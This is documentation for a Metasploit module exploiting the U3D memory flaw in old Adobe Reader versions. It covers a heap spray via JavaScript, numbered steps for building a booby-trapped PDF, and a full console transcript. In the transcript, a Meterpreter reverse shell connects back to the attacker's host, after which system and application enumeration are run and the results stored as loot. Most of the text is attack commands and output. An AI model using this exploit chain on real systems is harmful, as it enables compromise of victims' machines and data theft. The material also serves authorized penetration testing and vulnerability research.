## Vulnerable Application

This module exploits a vulnerability in the U3D handling within versions 9.x through 9.4.6 and 10 through to 10.1.1 of Adobe Reader.
The vulnerability is due to the use of uninitialized memory. Arbitrary code execution is achieved by embedding specially
crafted U3D data into a PDF document. A heap spray via JavaScript is used in order to ensure that the memory
used by the invalid pointer issue is controlled.

Link to vulnerable software [OldVersion](http://www.oldversion.com/windows/download/acrobat-reader-9-4-0)

## Verification Steps

   1. Install application on the target machine
   2. Start msfconsole
   3. Do: ```use exploit/windows/fileformat/adobe_reader_u3d```
   4. Do: ```set payload [windows/meterpreter/reverse_tcp]```
   5. Do: ```set LHOST [IP]```
   6. Do: ```exploit```
   7. Do: ```use [exploit/multi/handler```
   8. Do: ```set LHOST [IP]```
   9. Do: ```exploit```
   10. Do: Open PDF on target machine with vulnerable software

## Options

  **FILENAME**

  The file name.

  **OBFUSCATE**

  Enable JavaScript obfuscation

## Scenarios

### Adobe Reader 9.4.0 on Windows XP (5.1 Build 2600, Service Pack 3)

  ```
  msf > use exploit/windows/fileformat/adobe_reader_u3d
  msf exploit(windows/fileformat/adobe_reader_u3d) > set FILENAME myFile.pdf
    FILENAME => myFile.pdf
  msf exploit(windows/fileformat/adobe_reader_u3d) > set LHOST 192.168.1.3
    LHOST => 192.168.1.3
  msf exploit(windows/fileformat/adobe_reader_u3d) > exploit

    [*] Creating 'myFile.pdf' file...
    [+] myFile.pdf stored at /root/.msf4/local/myFile.pdf
  msf exploit(windows/fileformat/adobe_reader_u3d) > use exploit/multi/handler
  msf exploit(multi/handler) > set LHOST 192.168.1.3
    LHOST => 192.168.1.3
  msf5 exploit(multi/handler) > exploit

    [*] Started reverse TCP handler on 192.168.1.3:4444
    [*] Sending stage (180291 bytes) to 192.168.1.5
    [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.5:1103) at 2019-12-05 18:01:07 -0700
  meterpreter > sysinfo
    Computer        : COMPUTER_1
    OS              : Windows XP (5.1 Build 2600, Service Pack 3).
    Architecture    : x86
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x86/windows
  meterpreter > getuid
    Server username: COMPUTER_1\USER
  meterpreter > run post/windows/gather/enum_applications

    [*] Enumerating applications installed on COMPUTER_1

    Installed Applications
    ======================

    Name                Version
    ----                -------
    Adobe Reader 9.4.0  9.4.0


    [+] Results stored in: /root/.msf4/loot/20191205180436_default_192.168.1.5_host.application_540854.txt
  ```
